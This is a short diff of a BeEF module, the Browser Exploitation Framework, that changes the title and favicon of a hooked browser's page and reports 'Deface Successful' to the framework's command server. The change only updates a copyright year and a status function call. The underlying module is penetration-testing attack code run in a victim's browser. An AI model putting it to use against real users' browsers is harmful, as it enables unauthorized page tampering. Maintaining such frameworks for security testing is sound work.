@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - https://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -9,5 +9,5 @@ beef.execute(function() {
 	document.title = "<%= @deface_title %>";
 	beef.browser.changeFavicon("<%= @deface_favicon %>");
 
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Deface Successful", beef.are.status_success());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Deface Successful", beef.status.success());
 });
